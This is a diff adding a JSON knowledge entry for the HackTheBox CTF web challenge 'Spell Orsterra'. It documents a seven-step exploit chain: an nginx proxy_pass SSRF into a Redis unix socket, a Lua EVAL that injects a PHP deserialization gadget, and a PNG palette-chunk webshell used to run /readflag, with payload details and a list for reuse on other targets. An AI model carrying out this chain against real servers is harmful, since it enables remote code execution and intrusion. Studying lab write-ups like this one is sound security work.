@@ -1,0 +1,127 @@
+{
+  "schema_version": 1,
+  "id": "htb-spell-orsterra-nginx-unixsocket-redis-messenger-pop-plte-rce",
+  "source_note": "solved/spell-orsterra.md",
+  "challenge": {
+    "name": "Spell Orsterra",
+    "platform": "HackTheBox",
+    "event": "University CTF 2022",
+    "category": "web",
+    "solved_at": "2026-09-24",
+    "assistance": "writeup-assisted"
+  },
+  "stack": [
+    "php",
+    "symfony",
+    "twig",
+    "doctrine",
+    "sqlite",
+    "redis",
+    "symfony-messenger",
+    "nginx",
+    "apache",
+    "gd"
+  ],
+  "preconditions": {
+    "all_of": [
+      "a reverse proxy builds its upstream from a request-controlled value (proxy_pass http://$1)",
+      "a queue or cache on loopback is consumed by a worker that unserialize()s the payload"
+    ],
+    "any_of": [
+      "the service is also bound to a unix socket the proxy user can reach",
+      "an application class with a __destruct that writes a file to a controlled path"
+    ]
+  },
+  "signals": [
+    "proxy_pass",
+    "$1",
+    "assets",
+    "unix socket",
+    "redis.sock",
+    "unixsocketperm",
+    "ssrf",
+    "redis",
+    "eval",
+    "xadd",
+    "messenger",
+    "unserialize",
+    "__destruct",
+    "imagepng",
+    "export_file",
+    "plte",
+    "readflag",
+    "supervisord",
+    "APP_ENV=dev"
+  ],
+  "chain": [
+    {
+      "step": 1,
+      "stage": "recon",
+      "action": "read config before code: redis.conf, nginx.conf/proxy.conf, Dockerfile, supervisord.conf",
+      "why": "readflag SUID plus a loopback redis plus a proxy that interpolates a request value named the whole chain before any payload"
+    },
+    {
+      "step": 2,
+      "stage": "primitive",
+      "action": "GET /assets/127.0.0.1:80/ and confirm the app's own page comes back, then /assets/example.com/ for egress",
+      "why": "proves proxy_pass http://$1 is a full SSRF and tells you whether the box can fetch an attacker-hosted file later"
+    },
+    {
+      "step": 3,
+      "stage": "pivot",
+      "action": "point the same location at the unix socket: /assets/unix:/run/redis/redis.sock:%22<lua>%22%200%20<hex>  \u2014 nginx accepts unix:<path>:<uri>, percent-DECODES the uri, and passes the HTTP method through as the first inline token",
+      "why": "a header-based 302 redirect (as published) is unnecessary: percent-decoding supplies the literal spaces the Redis inline protocol needs, so no external server is required for the write"
+    },
+    {
+      "step": 4,
+      "stage": "sink",
+      "action": "curl -X EVAL so the request line becomes: EVAL \"<lua>\" 0 <hex> HTTP/1.0 ; lua hex-decodes ARGV[1] and XADDs it to the messenger stream",
+      "why": "EVAL is still available when SCRIPT/CONFIG/FLUSHALL/MODULE are renamed away, and ARGV[2] absorbs the trailing HTTP/1.0 token"
+    },
+    {
+      "step": 5,
+      "stage": "payload",
+      "action": "stream field is plain JSON: XADD messages * message '{\"body\":addslashes(serialize($envelope)),\"headers\":[]}' ; nest App\\MessageHandler\\SubscribeNotificationHandler as a property of the message object so its __destruct runs",
+      "why": "PhpSerializer::decode() stripslashes() then unserialize()s; the handler's __destruct reaches MapExportService::generateMap() -> imagepng($map,'/www/public/static/exports/'.$export_file) = arbitrary-path write"
+    },
+    {
+      "step": 6,
+      "stage": "payload",
+      "action": "make the written PNG a PALETTE image whose PLTE chunk literally spells <?=`$_GET[1]`?>, set handler x/y off-canvas (9999) and width<=30 so both imagecopymerge calls are no-ops",
+      "why": "PLTE is raw and uncompressed and GD only APPENDS palette entries, so the payload survives re-encoding deterministically; the published IDAT byte array does not survive current GD/zlib (dynamic Huffman block)"
+    },
+    {
+      "step": 7,
+      "stage": "flag",
+      "action": "export_file=exploit.php, then GET /static/exports/exploit.php?1=/readflag",
+      "why": "mod_php executes the PNG, echoing file bytes up to the tag then the command output; /root is 0700 so only the SUID helper can read the flag"
+    }
+  ],
+  "first_confirming_probe": {
+    "request": "inject the POP chain with map/stamp set to the target's OWN static PNG and export_file set to a unique probe name, then GET /static/exports/<probe>.png",
+    "expected": "HTTP 200 with PNG magic, which proves SSRF + redis write + unserialize + __destruct + arbitrary-path write in one shot without hosting anything",
+    "falsifier": "404 after two worker cycles (~2 min): either the stream name/serializer shape is wrong or the XADD never landed"
+  },
+  "blast_radius": "shared instance: the EVAL adds one entry to the 'messages' stream (worker.sh DELs that key every cycle) and the chain writes one file into the web-served exports directory. Use a unique filename, never touch session keys, and delete both the probe file and the webshell with the shell you gain. CONFIG/FLUSHALL/MODULE/SCRIPT are renamed away server-side, so the classic RDB-write path is closed.",
+  "verification": {
+    "status": "verified_live",
+    "evidence": "flag returned by /readflag through the PLTE webshell, printed immediately after the literal PLTE bytes in the response"
+  },
+  "reuse_when": [
+    "nginx (or any proxy) builds proxy_pass from a request-controlled variable",
+    "a line-protocol service is reachable on loopback OR on a unix socket the proxy user's group can open",
+    "a worker unserialize()s queue payloads and any loaded class has a file-writing __destruct",
+    "a GD pipeline re-encodes an attacker-supplied image and the output path is controlled"
+  ],
+  "known_traps": [
+    "writeup-assisted, but two published details are stale: writeup_search named the technique; the chain was re-derived from source and improved twice: the external redirect server is unnecessary (nginx percent-decodes the unix: uri), and the published IDAT pixel array no longer survives GD/zlib so the payload moved to the PLTE chunk",
+    "the published writeup wraps the stream field as s:1053:\"{...}\"; that is wrong - the field is plain json_encode(['body'=>..,'headers'=>..]) and a wrapper makes json_decode fail",
+    "PhpSerializer::encode applies addslashes(), and decode() applies stripslashes(), so the body MUST be pre-slashed; addslashes also removes the raw NULs of private-property mangling, which keeps the body valid UTF-8 and avoids the base64 branch (taken only when the body does not end with '}')",
+    "a trailing slash on the /assets/ URL lands on the numkeys argument (0/) and Redis rejects the EVAL; the location regex ~ /assets/(.+)/ is unanchored and the '/' inside unix:/run/... already satisfies it, so omit it",
+    "the write is blind: Redis kills the connection on the 'Host:' line via freeClientAsync, discarding the already-queued reply, so nginx always answers 502 - judge success only by an out-of-band observable",
+    "the Synacktiv IDAT pixel array from the writeup produces no payload on current GD/zlib; verify any image payload by replaying the target's exact transform chain before trusting it",
+    "getExportedMap()'s base64 read is a dead end: the result goes into a local variable and mail() is handed the undefined $this->body, so it exfiltrates nothing",
+    "keep the map small and the handler coordinates off-canvas: imagecopymerge with a negative dst_x still clips and rewrites columns from dst_y down, which perturbs the palette"
+  ],
+  "flag": null
+}
